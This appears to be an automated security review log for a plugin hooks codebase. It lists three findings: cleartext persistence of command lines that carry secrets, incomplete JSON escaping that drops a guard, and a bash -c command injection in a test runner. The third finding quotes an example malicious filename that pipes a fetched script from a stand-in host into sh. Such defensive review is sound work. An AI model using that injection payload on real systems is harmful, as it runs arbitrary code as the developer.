Verdict: CONCERNS
Failures: 0

<!-- verdict:end -->

# Build Challenge

Lens: Security — auth, secrets, input validation, data exposure, OWASP, data-access policies / tenancy.

## Findings Log

<!-- bkit:task 1 start -->

- [ ] **TASK 1:** Antigravity `bkit-rules.cjs` registers on `run_command`, so the deny-once store persists the first call's full shell command line — inline secrets included — in cleartext, world-readable, with no TTL
      **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/hooks/antigravity-hook.js:63`
  - **DONE WHEN:** `adviseOnce` no longer stores the raw call signature — it writes and compares a one-way hash (e.g. SHA-256) of the signature, so no tool argument of any host hook rests on disk in cleartext; deny-once retry behaviour is unchanged on all three Antigravity hooks. Today `agCallSignature` keeps every non-label arg, so a first `run_command` call's `CommandLine` (e.g. `export AWS_SECRET_ACCESS_KEY=…`, `curl -H "Authorization: Bearer …"`) is written verbatim by `fs.writeFileSync(file, signature)` to `os.tmpdir()/bkit-antigravity-retry/rules.<session>.json` at default 0644, and the file is removed only when the identical call is retried — an agent that rephrases instead of retrying leaves it forever, readable by any local user on a multi-user host. The pre-existing GateGuard registered edit tools only (file paths); this diff's matcher `write_to_file|replace_file_content|view_file|run_command` (`.bkit/shared/.agents/plugins/bkit/hooks.json`, `.agents/plugins/bkit/hooks.json`) widens the at-rest exposure from paths to command lines.
  - **TEST FIRST:**
    - `.bkit/core/engine/audits/hooks/session-rules-advisory.integration.test.ts` `the antigravity retry store never persists a raw command line` fails on the finding — spawn the rendered Antigravity hook with a `run_command` payload whose `CommandLine` carries a marker string; after the deny, `os.tmpdir()/bkit-antigravity-retry/rules.<safe>.json` contains the marker verbatim today, and the test asserts it does not (hashed form) while the identical retry is still allowed.

<!-- bkit:task 1 end -->

<!-- bkit:task 2 start -->

- [ ] **TASK 2:** The hand-rolled `bkit_json_escape` leaves every control character except `\n` `\r` `\t` raw, so untrusted guard content carrying one yields an unparseable SessionStart document the host discards whole — silently dropping the Linear guard's HARD STOP with the advisory
      **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/.claude/hooks/bkit-preflight.sh:46`
  - **DONE WHEN:** `bkit_write_document` emits a document that parses for any byte the accumulated context can hold — the full U+0000–U+001F range is escaped (or the writer routes through a JSON encoder when one is on PATH, keeping the `printf` path as the no-`python3` fallback) — in both SessionStart templates and their rendered mirrors (`.bkit/core/.claude/hooks/bkit-preflight.sh:46`, `.bkit/core/.cursor/hooks/bkit-preflight.sh:44`, `.claude/hooks/bkit-preflight.sh`, `.cursor/hooks/bkit-preflight.sh`). Reproduced: `bkit_json_escape` on a context containing `\x0b` emits it raw and `JSON.parse` rejects the document ("Bad control character in string literal"). The content path is untrusted: the Linear guard interpolates the API's `identifier` / custom `state` / `labels` names and the env `LINEAR_ISSUE_ID` verbatim into `emit_context` (`.bkit/core/hooks/preflight-linear.sh:8,35,68,72`); the removed `python3 json.dumps` path escaped the full range, so this is a regression, and the diff's own knowledge row `kn-hooks-sessionstart-stdout-is-one-json-document` records that a rejected document drops bkit's whole output with a zero exit.
  - **TEST FIRST:**
    - `.bkit/core/engine/audits/hooks/preflight-sh.integration.test.ts` `a context carrying a control character still yields one parseable JSON document` fails on the finding — run the rendered Claude hook with `LINEAR_ISSUE_ID` carrying `\x0b` and no `BKIT_LINEAR_API_KEY` (the key-missing FAIL message interpolates the id verbatim); today `JSON.parse(result.stdout)` throws, and the test asserts the document parses and its context still contains the HARD STOP.

<!-- bkit:task 2 end -->

<!-- bkit:task 3 start -->

- [ ] **TASK 3:** Vendored `test-hook.sh` expands the hook and input paths unquoted inside a `bash -c` string, so a crafted file path in a tested hook pack injects and runs arbitrary commands as the developer
      **Severity:** LOW · **Class:** mechanical · **Fixable:** true · **Location:** `.agents/skills/hook-development/scripts/test-hook.sh:190`
  - **DONE WHEN:** the runner no longer interpolates user-supplied paths into the `bash -c` command string — `output=$(timeout "$TIMEOUT" bash -c "cat '$TEST_INPUT' | $HOOK_SCRIPT" 2>&1)` lets a test-input filename containing a single quote break out of its quoting, and `$HOOK_SCRIPT` expands unquoted (word-splitting and metacharacters), so a hook pack shipping a path like `in/'; curl evil.sh | sh; '.json` executes the payload when the developer tests hooks from that pack. Pass both paths out-of-band (positional params: `bash -c 'cat "$1" | "$2"' _ "$TEST_INPUT" "$HOOK_SCRIPT"`, or env vars) and drop the non-executable fallback that rewrites `HOOK_SCRIPT` to `bash $HOOK_SCRIPT`. This is a supply-chain surface: the script is new executable content vendored via `skills-lock.json` (`anthropics/claude-code`), so the fix also wants the lock hash refreshed or an upstream report.
  - **TEST FIRST:**
    - `.bkit/core/engine/audits/repo/hook-skill-scripts.test.ts` `test-hook.sh passes hook and input paths to its runner without unquoted expansion` fails on the finding — a static assertion (the `json-parse-owner.test.ts` pattern) over `.agents/skills/hook-development/scripts/*.sh` rejects any `bash -c` command string that interpolates a caller-controlled variable, and today's line 190 matches.

<!-- bkit:task 3 end -->
